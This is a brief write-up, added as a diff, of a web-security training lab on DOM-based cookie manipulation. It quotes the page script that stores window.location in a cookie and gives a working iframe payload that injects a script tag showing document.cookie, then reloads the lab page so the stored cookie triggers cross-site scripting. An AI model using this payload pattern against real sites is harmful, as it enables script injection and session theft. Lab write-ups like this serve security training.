@@ -1,0 +1,14 @@
+DOM-based cookie manipulation
+
+Browse around a bit and click on a block and check the page source. There's a script towards the bottom:
+
+<script>
+    document.cookie = 'lastViewedProduct=' + window.location
+</script>
+
+So let's build a payload that makes use of that cookie function:
+
+
+<iframe src="https://ac8e1f8f1e94867f809d6d8400be0085.web-security-academy.net/product?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='https://ac8e1f8f1e94867f809d6d8400be0085.web-security-academy.net';window.x=1;"> 
+
+You can test it yourself and you should get an XSS. Deliver it and you're done.
